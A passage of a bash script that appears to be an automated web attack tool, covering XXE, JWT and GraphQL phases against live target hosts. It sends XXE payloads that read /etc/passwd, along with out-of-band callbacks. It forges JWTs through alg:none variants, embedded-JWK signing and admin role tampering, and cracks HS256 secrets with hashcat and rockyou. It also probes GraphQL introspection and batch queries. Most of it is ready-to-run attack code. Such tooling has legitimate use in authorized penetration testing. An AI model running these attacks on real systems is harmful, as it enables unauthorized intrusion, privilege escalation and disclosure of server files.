                    log_finding "SSTI detected (probe: ${probe}): $url"
                    ((findings++))
                    break
                fi
            fi
        done
    done < "$ssti_candidates"

    log_ok "SSTI: ${tested} URLs tested, ${findings} findings â†’ $ssti_out"

    # Nuclei SSTI results already in injections.jsonl
    local nuclei_ssti; nuclei_ssti=$(python3 -c "
import json
count=0
for line in open('$VULN_DIR/nuclei/injections.jsonl'):
    try:
        d=json.loads(line)
        if 'ssti' in str(d.get('info',{}).get('tags','')).lower(): count+=1
    except: pass
print(count)" 2>/dev/null || echo 0)
    [[ "$nuclei_ssti" -gt 0 ]] && log_ok "  Nuclei SSTI findings (from phase_vulns): ${nuclei_ssti}"
    [[ $findings -gt 0 ]] && notify_all "ðŸ§¨ SSTI findings on \`${TARGET}\`: ${findings}"
}

# â”€â”€â”€ Phase 10c: XXE Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Tests XML-consuming endpoints for XXE via file read and OOB callbacks.
phase_xxe() {
    log_phase "Phase 10c: XXE (XML External Entity Injection)"

    [[ ! -s "$ALL_URLS" ]] && { log_warn "No URLs for XXE testing."; return; }

    mkdir -p "$VULN_DIR/xxe"
    local xxe_out="$VULN_DIR/xxe/findings.txt"
    > "$xxe_out"

    # Find XML/SOAP/API endpoints by URL pattern and content-type probe
    local xxe_candidates="$VULN_DIR/xxe/candidates.txt"
    grep -iE "\.(xml|xsl|xslt|wsdl|asmx|soap)|/api/|/ws/|/service/|/rpc" \
        "$ALL_URLS" 2>/dev/null | sort -u > "$xxe_candidates"

    # Also probe live hosts for endpoints that accept XML
    if [[ -s "$LIVE_HOSTS" ]]; then
        local xml_endpoints="$VULN_DIR/xxe/xml_endpoints.txt"
        while IFS= read -r host; do
            waf_sleep
            # HEAD request to common XML API paths
            for path in /api /api/v1 /ws /service /rpc /soap /xml; do
                local ct; ct=$(curl -sI --connect-timeout 5 --max-time 8 \
                    ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                    "${host}${path}" 2>/dev/null | grep -i "content-type" | head -1)
                if echo "$ct" | grep -qiE "xml|soap|wsdl|xhtml"; then
                    echo "${host}${path}" >> "$xml_endpoints"
                fi
            done
        done < <(head -30 "$LIVE_HOSTS")
        [[ -s "$xml_endpoints" ]] && cat "$xml_endpoints" >> "$xxe_candidates"
    fi

    sort -u "$xxe_candidates" -o "$xxe_candidates"
    local cand_count; cand_count=$(wc -l < "$xxe_candidates" 2>/dev/null || echo 0)
    log_info "XXE candidates: ${cand_count}"
    [[ "$cand_count" -eq 0 ]] && { log_info "No XML endpoints found."; return; }

    # XXE payload: attempt to read /etc/passwd (in-band detection)
    local xxe_payload_inband='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
    local xxe_payload_error='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///nonexistent_webpwn_file">]><test>&xxe;</test>'

    local tested=0 findings=0
    while IFS= read -r url; do
        [[ $tested -ge 100 ]] && break
        ((tested++))
        waf_sleep

        # Send XML POST with in-band payload
        local resp; resp=$(curl -s --connect-timeout 10 --max-time 15 \
            -X POST \
            -H "Content-Type: application/xml" \
            -d "$xxe_payload_inband" \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$url" 2>/dev/null)

        if echo "$resp" | grep -qE "root:x:0|bin:x:|nobody:x:|/bin/bash|/bin/sh"; then
            echo "[XXE][INBAND][file_read] $url" >> "$xxe_out"
            log_finding "XXE in-band file read (/etc/passwd): $url"
            ((findings++))
            continue
        fi

        # Error-based: meaningful XML parser error may disclose path/entity info
        local err_resp; err_resp=$(curl -s --connect-timeout 10 --max-time 15 \
            -X POST \
            -H "Content-Type: application/xml" \
            -d "$xxe_payload_error" \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$url" 2>/dev/null)

        if echo "$err_resp" | grep -qiE "nonexistent_webpwn|failed to load|unable to open|file not found|no such file"; then
            echo "[XXE][ERROR_BASED] $url" >> "$xxe_out"
            log_finding "XXE error-based indicator (entity processing confirmed): $url"
            ((findings++))
        fi
    done < "$xxe_candidates"

    # OOB probe with interactsh if available
    if has_tool interactsh-client && [[ -s "$xxe_candidates" ]]; then
        log_info "XXE OOB probe with interactsh..."
        local issh_url; issh_url=$(interactsh-client -server "${INTERACTSH_SERVER}" -n 1 2>/dev/null | head -1)
        if [[ -n "$issh_url" ]]; then
            local xxe_oob="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://${issh_url}/webpwn-xxe\">]><test>&xxe;</test>"
            local issh_out; issh_out=$(mktemp /tmp/webpwn_xxe_issh_XXXXXX)
            timeout 30 interactsh-client -server "${INTERACTSH_SERVER}" -json -o "$issh_out" &>/dev/null &
            local issh_pid=$!
            head -20 "$xxe_candidates" | while IFS= read -r url; do
                waf_sleep
                curl -s --connect-timeout 10 --max-time 15 \
                    -X POST -H "Content-Type: application/xml" \
                    -d "$xxe_oob" \
                    ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                    "$url" >/dev/null 2>&1 || true
            done
            sleep 10
            kill "$issh_pid" 2>/dev/null || true
            if [[ -s "$issh_out" ]]; then
                cp "$issh_out" "$VULN_DIR/xxe/interactsh_hits.json"
                log_finding "XXE OOB callback hits: $(wc -l < "$issh_out") â†’ $VULN_DIR/xxe/interactsh_hits.json"
                ((findings+=$(wc -l < "$issh_out")))
            fi
            rm -f "$issh_out"
        fi
    fi

    log_ok "XXE: ${tested} endpoints tested, ${findings} findings â†’ $xxe_out"
    [[ $findings -gt 0 ]] && notify_all "ðŸ’£ XXE findings on \`${TARGET}\`: ${findings}"
}

# â”€â”€â”€ Phase 10d: JWT Attack Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Tests collected JWTs for: alg:none, weak HS256 secret, RSâ†’HS confusion,
# missing signature validation, and kid injection.
phase_jwt_attacks() {
    log_phase "Phase 10d: JWT Attack Testing"

    # Collect JWTs: from auth setup + any discovered in recon
    local jwt_list=()
    [[ -n "$AUTH_TOKEN" ]] && jwt_list+=("$AUTH_TOKEN")
    [[ -n "$AUTH2_TOKEN" ]] && jwt_list+=("$AUTH2_TOKEN")

    # Also scrape JWTs from saved responses and JS files
    local extra_jwts="$VULN_DIR/jwt/discovered.txt"
    mkdir -p "$VULN_DIR/jwt"
    > "$extra_jwts"

    if [[ -s "$LIVE_HOSTS" ]]; then
        while IFS= read -r host; do
            waf_sleep
            curl -sI --connect-timeout 5 --max-time 8 "$host" 2>/dev/null | \
                grep -oE "ey[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" >> "$extra_jwts" || true
        done < <(head -20 "$LIVE_HOSTS")
    fi

    while IFS= read -r jwt; do
        [[ -n "$jwt" ]] && jwt_list+=("$jwt")
    done < "$extra_jwts"

    # Deduplicate
    local -A seen_jwts=()
    local unique_jwts=()
    for jwt in "${jwt_list[@]}"; do
        [[ -z "$jwt" || -v "seen_jwts[$jwt]" ]] && continue
        seen_jwts[$jwt]=1
        unique_jwts+=("$jwt")
    done

    if [[ ${#unique_jwts[@]} -eq 0 ]]; then
        log_info "No JWTs found for attack testing."
        return
    fi

    log_info "Testing ${#unique_jwts[@]} JWT(s) for vulnerabilities..."
    local jwt_out="$VULN_DIR/jwt/findings.txt"
    > "$jwt_out"
    local findings=0

    for jwt in "${unique_jwts[@]}"; do
        local short="${jwt:0:40}..."

        # â”€â”€ Decode header â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local header; header=$(python3 -c "
import sys, json, base64
parts = sys.argv[1].split('.')
pad = parts[0] + '=' * (4 - len(parts[0]) % 4)
try: print(json.dumps(json.loads(base64.urlsafe_b64decode(pad))))
except: pass
" "$jwt" 2>/dev/null || echo "")

        local alg; alg=$(echo "$header" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('alg',''))" 2>/dev/null || echo "")
        local kid; kid=$(echo "$header" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('kid',''))" 2>/dev/null || echo "")

        log_info "  JWT alg=${alg} kid=${kid:0:20} â€” ${short}"

        # â”€â”€ Attack 1: alg:none â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local none_jwt; none_jwt=$(python3 -c "
import sys, json, base64
jwt = sys.argv[1]
parts = jwt.split('.')
def b64pad(s):
    return s + '=' * (4 - len(s) % 4)
header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
header['alg'] = 'none'
new_hdr = base64.urlsafe_b64encode(json.dumps(header, separators=(',','!')).encode()).rstrip(b'=').decode()
print(f'{new_hdr}.{parts[1]}.')
" "$jwt" 2>/dev/null || echo "")

        if [[ -n "$none_jwt" ]] && [[ -s "$LIVE_HOSTS" ]]; then
            local host; host=$(head -1 "$LIVE_HOSTS")
            local none_resp; none_resp=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 8 --max-time 12 \
                -H "Authorization: Bearer ${none_jwt}" "$host" 2>/dev/null)
            if [[ "$none_resp" =~ ^2 ]]; then
                echo "[JWT][ALG_NONE][${none_resp}] ${short}" >> "$jwt_out"
                log_finding "JWT alg:none accepted (HTTP ${none_resp}): ${short}"
                ((findings++))
            fi
        fi

        # â”€â”€ Attack 2: Weak HS256 secret brute-force â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if [[ "$alg" == "HS256" ]] && require_tool hashcat; then
            log_info "  Brute-forcing HS256 secret with common passwords..."
            local jwt_hash_file; jwt_hash_file=$(mktemp /tmp/webpwn_jwt_XXXXXX)
            echo "$jwt" > "$jwt_hash_file"
            local wordlist="${WORDLIST_DIR}/Passwords/Common-Credentials/10k-most-common.txt"
            [[ ! -f "$wordlist" ]] && wordlist="/usr/share/wordlists/rockyou.txt"
            if [[ -f "$wordlist" ]]; then
                local cracked; cracked=$(hashcat -m 16500 -a 0 --quiet \
                    --potfile-disable --status-timer 5 \
                    "$jwt_hash_file" "$wordlist" 2>/dev/null | \
                    grep -oP '(?<=:)[^:]+$' | head -1)
                if [[ -n "$cracked" ]]; then
                    echo "[JWT][WEAK_SECRET][secret=${cracked}] ${short}" >> "$jwt_out"
                    log_finding "JWT weak HS256 secret cracked: '${cracked}' â†’ ${short}"
                    ((findings++))
                fi
            fi
            rm -f "$jwt_hash_file"
        fi

        # â”€â”€ Attack 3: RS256 â†’ HS256 confusion â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if [[ "$alg" == "RS256" ]] && [[ -s "$LIVE_HOSTS" ]]; then
            log_info "  Testing RS256â†’HS256 algorithm confusion..."
            local host; host=$(head -1 "$LIVE_HOSTS")
            # Fetch the server's public key from well-known endpoints
            local pub_key_url=""
            for jwks_path in "/.well-known/jwks.json" "/oauth/jwks" "/api/jwks" "/jwks.json" "/.well-known/openid-configuration"; do
                local r; r=$(curl -s --connect-timeout 5 --max-time 8 "${host}${jwks_path}" 2>/dev/null)
                if echo "$r" | grep -q '"keys"'; then
                    pub_key_url="${host}${jwks_path}"
                    echo "$r" > "$VULN_DIR/jwt/jwks.json"
                    break
                fi
            done
            [[ -n "$pub_key_url" ]] && \
                echo "[JWT][JWKS_FOUND] ${pub_key_url}" >> "$jwt_out" && \
                log_info "  JWKS endpoint found: ${pub_key_url} â€” manual RS256â†’HS256 confusion test recommended"
        fi

        # â”€â”€ Attack 4: kid SQL injection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if [[ -n "$kid" ]]; then
            if echo "$kid" | grep -qE "['\";|]|--|\.\./|/etc/passwd"; then
                echo "[JWT][KID_INJECTION_SUSPECTED][kid=${kid:0:50}] ${short}" >> "$jwt_out"
                log_finding "JWT kid parameter looks injectable: '${kid:0:50}'"
                ((findings++))
            fi
        fi

        # â”€â”€ Attack 5: Expiry check â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local exp; exp=$(python3 -c "
import sys, json, base64, time
jwt = sys.argv[1]
parts = jwt.split('.')
pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(pad))
    exp = d.get('exp', 0)
    if exp > 0 and exp < time.time():
        print('expired')
    elif exp == 0:
        print('no_exp')
    else:
        print(f'valid_until_{exp}')
except: pass
" "$jwt" 2>/dev/null || echo "")
        if [[ "$exp" == "expired" ]]; then
            log_info "  JWT is expired â€” server should reject it"
        elif [[ "$exp" == "no_exp" ]]; then
            echo "[JWT][NO_EXPIRY] ${short}" >> "$jwt_out"
            log_finding "JWT has no expiry (exp claim missing): ${short}"
            ((findings++))
        fi

        # â”€â”€ Attack 6: alg:none with variant casing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        # Some validators are case-sensitive; try "None", "NONE", ""
        if [[ -n "$none_jwt" ]] && [[ -s "$LIVE_HOSTS" ]]; then
            local host_test; host_test=$(head -1 "$LIVE_HOSTS")
            for none_variant in "None" "NONE" ""; do
                local variant_jwt; variant_jwt=$(python3 -c "
import sys, json, base64
jwt = sys.argv[1]; variant = sys.argv[2]
parts = jwt.split('.')
def b64pad(s): return s + '=' * (4 - len(s) % 4)
header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
header['alg'] = variant
new_hdr = base64.urlsafe_b64encode(json.dumps(header, separators=(',','!')).encode()).rstrip(b'=').decode()
print(f'{new_hdr}.{parts[1]}.')
" "$jwt" "$none_variant" 2>/dev/null || echo "")
                [[ -z "$variant_jwt" ]] && continue
                local v_resp; v_resp=$(curl -s -o /dev/null -w "%{http_code}" \
                    --connect-timeout 8 --max-time 12 \
                    -H "Authorization: Bearer ${variant_jwt}" "$host_test" 2>/dev/null)
                if [[ "$v_resp" =~ ^2 ]]; then
                    echo "[JWT][ALG_NONE_VARIANT][alg='${none_variant}'][${v_resp}] ${short}" >> "$jwt_out"
                    log_finding "JWT alg:'${none_variant}' variant accepted (HTTP ${v_resp}): ${short}"
                    ((findings++))
                fi
            done
        fi

        # â”€â”€ Attack 7: Embedded JWK (CVE-2018-0114 style) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if [[ -s "$LIVE_HOSTS" ]]; then
            log_info "  Testing embedded JWK attack..."
            local host_test; host_test=$(head -1 "$LIVE_HOSTS")
            local jwk_jwt; jwk_jwt=$(python3 -c "
import sys, json, base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

jwt = sys.argv[1]
parts = jwt.split('.')
def b64pad(s): return s + '=' * (4 - len(s) % 4)
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

try:
    payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))
    # Generate attacker RSA key
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    pub = key.public_key()
    pub_nums = pub.public_key().public_numbers() if hasattr(pub, 'public_key') else pub.public_numbers()
    e_bytes = pub_nums.e.to_bytes((pub_nums.e.bit_length()+7)//8, 'big')
    n_bytes = pub_nums.n.to_bytes((pub_nums.n.bit_length()+7)//8, 'big')
    jwk = {'kty':'RSA','n':b64u(n_bytes),'e':b64u(e_bytes),'alg':'RS256'}
    new_hdr = {'alg':'RS256','jwk':jwk}
    hdr_b64 = b64u(json.dumps(new_hdr, separators=(',','!')).encode())
    pay_b64 = b64u(json.dumps(payload, separators=(',','!')).encode())
    signing_input = f'{hdr_b64}.{pay_b64}'.encode()
    sig = key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    print(f'{hdr_b64}.{pay_b64}.{b64u(sig)}')
except Exception as ex:
    pass
" "$jwt" 2>/dev/null || echo "")
            if [[ -n "$jwk_jwt" ]]; then
                local jwk_resp; jwk_resp=$(curl -s -o /dev/null -w "%{http_code}" \
                    --connect-timeout 8 --max-time 12 \
                    -H "Authorization: Bearer ${jwk_jwt}" "$host_test" 2>/dev/null)
                if [[ "$jwk_resp" =~ ^2 ]]; then
                    echo "[JWT][EMBEDDED_JWK_ACCEPTED][${jwk_resp}] ${short}" >> "$jwt_out"
                    log_finding "JWT embedded JWK accepted (CVE-2018-0114 style, HTTP ${jwk_resp}): ${short}"
                    ((findings++))
                fi
            fi
        fi

        # â”€â”€ Attack 8: Claim tampering â€” try to elevate role â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if [[ -s "$LIVE_HOSTS" ]]; then
            log_info "  Testing claim tampering (role escalation)..."
            local host_test; host_test=$(head -1 "$LIVE_HOSTS")
            local tamper_jwt; tamper_jwt=$(python3 -c "
import sys, json, base64
jwt = sys.argv[1]
parts = jwt.split('.')
def b64pad(s): return s + '=' * (4 - len(s) % 4)
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))
# Escalate role fields
for k in ['role','roles','scope','authorities','permissions','groups','is_admin','admin']:
    if k in payload:
        v = payload[k]
        if isinstance(v, str):
            payload[k] = 'admin'
        elif isinstance(v, list):
            payload[k] = ['admin','superuser']
        elif isinstance(v, bool):
            payload[k] = True
payload['is_admin'] = True
new_pay = b64u(json.dumps(payload, separators=(',','!')).encode())
# Keep original sig â€” tampered only payload, no re-sign
print(f'{parts[0]}.{new_pay}.{parts[2]}')
" "$jwt" 2>/dev/null || echo "")
            if [[ -n "$tamper_jwt" ]]; then
                local tamp_resp; tamp_resp=$(curl -s -o /dev/null -w "%{http_code}" \
                    --connect-timeout 8 --max-time 12 \
                    -H "Authorization: Bearer ${tamper_jwt}" "$host_test" 2>/dev/null)
                if [[ "$tamp_resp" =~ ^2 ]]; then
                    echo "[JWT][CLAIM_TAMPERING_ACCEPTED][${tamp_resp}] ${short}" >> "$jwt_out"
                    log_finding "JWT claim tampering accepted â€” role escalation possible (HTTP ${tamp_resp}): ${short}"
                    ((findings++))
                fi
            fi
        fi

        # â”€â”€ Attack 9: jwt_tool integration (if installed) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if require_tool jwt_tool; then
            log_info "  Running jwt_tool attacks..."
            local jt_out; jt_out=$(mktemp /tmp/webpwn_jwtool_XXXXXX)
            local host_test; host_test=$(head -1 "$LIVE_HOSTS" 2>/dev/null || echo "")
            if [[ -n "$host_test" ]]; then
                timeout 60 jwt_tool "$jwt" -t "$host_test" -rh "Authorization: Bearer JWT" \
                    -M pb 2>/dev/null | tee "$jt_out" | \
                    grep -iE "VULNERABLE|EXPLOIT|INJEC|CONFUS|NONE|WEAK" | \
                    while IFS= read -r line; do
                        echo "[JWT][JWTTOOL] ${line}" >> "$jwt_out"
                        log_finding "jwt_tool: ${line}"
                        ((findings++))
                    done
            fi
            rm -f "$jt_out"
        fi

        # â”€â”€ Attack 10: JKU/X5U header injection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        # Check if header contains jku or x5u â€” these are injection-prone
        local jku; jku=$(echo "$header" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jku',''))" 2>/dev/null || echo "")
        local x5u; x5u=$(echo "$header" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('x5u',''))" 2>/dev/null || echo "")
        if [[ -n "$jku" ]]; then
            echo "[JWT][JKU_HEADER_PRESENT][jku=${jku}] ${short}" >> "$jwt_out"
            log_finding "JWT jku header present â€” test URL redirection: ${jku}"
            ((findings++))
        fi
        if [[ -n "$x5u" ]]; then
            echo "[JWT][X5U_HEADER_PRESENT][x5u=${x5u}] ${short}" >> "$jwt_out"
            log_finding "JWT x5u header present â€” test URL redirection: ${x5u}"
            ((findings++))
        fi

    done

    log_ok "JWT attacks: ${#unique_jwts[@]} token(s) tested, ${findings} findings â†’ $jwt_out"
    [[ $findings -gt 0 ]] && notify_all "ðŸ”‘ JWT vulnerabilities on \`${TARGET}\`: ${findings}"
}

# â”€â”€â”€ Phase 10e: GraphQL Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Discovers GraphQL endpoints, runs introspection, and tests for common issues:
# introspection enabled, field suggestions, batch query abuse, IDOR via queries.
phase_graphql() {
    log_phase "Phase 10e: GraphQL Testing"

    mkdir -p "$VULN_DIR/graphql"
    local gql_out="$VULN_DIR/graphql/findings.txt"
    local gql_endpoints="$VULN_DIR/graphql/endpoints.txt"
    > "$gql_out"
    > "$gql_endpoints"

    # â”€â”€ Discover GraphQL endpoints â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local gql_paths=(
        "/graphql" "/graphql/v1" "/graphql/v2" "/graphql/v3"
        "/api/graphql" "/api/v1/graphql" "/api/v2/graphql"
        "/query" "/gql" "/graph"
        "/v1/graphql" "/v2/graphql"
        "/graphiql" "/playground"
        "/altair" "/explorer"
        "/__graphql"
    )

    if [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Discovering GraphQL endpoints..."
        while IFS= read -r host; do
            for path in "${gql_paths[@]}"; do
                waf_sleep
                local code; code=$(curl -s -o /dev/null -w "%{http_code}" \
                    --connect-timeout 5 --max-time 8 \
                    ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                    "${host}${path}" 2>/dev/null)
                # 200, 400 (invalid query but endpoint exists), 405 are all positive signals
                if [[ "$code" =~ ^(200|400|405)$ ]]; then
                    # Confirm it's actually GraphQL (send empty query, look for 'errors' or 'data')
                    local resp; resp=$(curl -s --connect-timeout 8 --max-time 12 \
                        -X POST -H "Content-Type: application/json" \
                        -d '{"query":"{ __typename }"}' \
                        ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
                        "${host}${path}" 2>/dev/null)
                    if echo "$resp" | grep -qE '"data"|"errors"|"__typename"'; then
                        echo "${host}${path}" >> "$gql_endpoints"
                        log_ok "  GraphQL endpoint: ${host}${path}"
                    fi
                fi
            done
        done < <(head -30 "$LIVE_HOSTS")
    fi

    # Also check URLs collected during crawl
    grep -iE "/graphql|/gql|/graph\b|/query\b|graphiql|playground" \
        "$ALL_URLS" 2>/dev/null | \
        sed 's|?.*||' | sort -u >> "$gql_endpoints"
    sort -u "$gql_endpoints" -o "$gql_endpoints"

    local ep_count; ep_count=$(wc -l < "$gql_endpoints" 2>/dev/null || echo 0)
    log_info "GraphQL endpoints found: ${ep_count}"
    [[ "$ep_count" -eq 0 ]] && { log_info "No GraphQL endpoints found."; return; }

    local findings=0
    while IFS= read -r ep; do
        log_info "Testing: $ep"

        # â”€â”€ Test 1: Introspection enabled â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local introspection_query='{"query":"{ __schema { queryType { name } types { name } } }"}'
        local intro_resp; intro_resp=$(curl -s --connect-timeout 10 --max-time 15 \
            -X POST -H "Content-Type: application/json" \
            -d "$introspection_query" \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$ep" 2>/dev/null)

        if echo "$intro_resp" | grep -q '"__schema"'; then
            echo "[GQL][INTROSPECTION_ENABLED] $ep" >> "$gql_out"
            log_finding "GraphQL introspection enabled: $ep"
            ((findings++))
            # Save schema
            echo "$intro_resp" > "$VULN_DIR/graphql/schema_$(echo "$ep" | md5sum | head -c 8).json"
        fi

        # â”€â”€ Test 2: Field suggestion (schema leak without introspection) â”€â”€â”€â”€â”€â”€â”€
        local suggest_resp; suggest_resp=$(curl -s --connect-timeout 10 --max-time 15 \
            -X POST -H "Content-Type: application/json" \
            -d '{"query":"{ usr { id } }"}' \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$ep" 2>/dev/null)

        if echo "$suggest_resp" | grep -qiE '"Did you mean|suggestions|Suggestion"'; then
            echo "[GQL][FIELD_SUGGESTIONS] $ep" >> "$gql_out"
            log_finding "GraphQL field suggestions enabled (schema leak): $ep"
            ((findings++))
        fi

        # â”€â”€ Test 3: Batch query abuse (DoS / auth bypass potential) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        # Send a batch of 10 identical simple queries
        local batch_payload='[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
        local batch_resp; batch_resp=$(curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 10 --max-time 15 \
            -X POST -H "Content-Type: application/json" \
            -d "$batch_payload" \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "$ep" 2>/dev/null)
        if [[ "$batch_resp" =~ ^2 ]]; then
            echo "[GQL][BATCH_QUERY_ALLOWED] $ep" >> "$gql_out"
            log_finding "GraphQL batch queries allowed (DoS/brute-force risk): $ep"
            ((findings++))
        fi

        # â”€â”€ Test 4: Unauthenticated access to sensitive types â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if [[ "$AUTH_MODE" != "none" ]]; then
            local unauth_resp; unauth_resp=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 8 --max-time 12 \
                -X POST -H "Content-Type: application/json" \
                -d '{"query":"{ __typename }"}' \
                "$ep" 2>/dev/null)
            if [[ "$unauth_resp" =~ ^2 ]]; then
                echo "[GQL][UNAUTH_ACCESS] $ep" >> "$gql_out"
                log_finding "GraphQL accessible without authentication: $ep"
                ((findings++))
            fi
        fi

        # â”€â”€ Test 5: GraphQL over GET (CSRF risk) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local get_resp; get_resp=$(curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 8 --max-time 12 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} \
            "${ep}?query=%7B__typename%7D" 2>/dev/null)
        if [[ "$get_resp" =~ ^2 ]]; then
            echo "[GQL][GET_METHOD_ALLOWED] $ep" >> "$gql_out"
            log_finding "GraphQL accepts GET requests (CSRF risk): $ep"
            ((findings++))
        fi

    done < "$gql_endpoints"

    # Nuclei GraphQL results already in injections.jsonl / panels_tokens.jsonl
    local nuclei_gql; nuclei_gql=$(python3 -c "
import json
count=0
for fname in ['$VULN_DIR/nuclei/injections.jsonl', '$VULN_DIR/nuclei/panels_tokens.jsonl']:
    try:
        for line in open(fname):
            try:
                d=json.loads(line)
                if 'graphql' in str(d.get('info',{}).get('tags','')).lower(): count+=1
            except: pass
    except: pass
print(count)" 2>/dev/null || echo 0)
    [[ "$nuclei_gql" -gt 0 ]] && log_ok "  Nuclei GraphQL findings (from phase_vulns): ${nuclei_gql}"

    log_ok "GraphQL: ${ep_count} endpoint(s) tested, ${findings} findings â†’ $gql_out"
    [[ $findings -gt 0 ]] && notify_all "ðŸ•¸ï¸ GraphQL issues on \`${TARGET}\`: ${findings}"
}

# â”€â”€â”€ Phase 10f: OAuth / OIDC Testing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
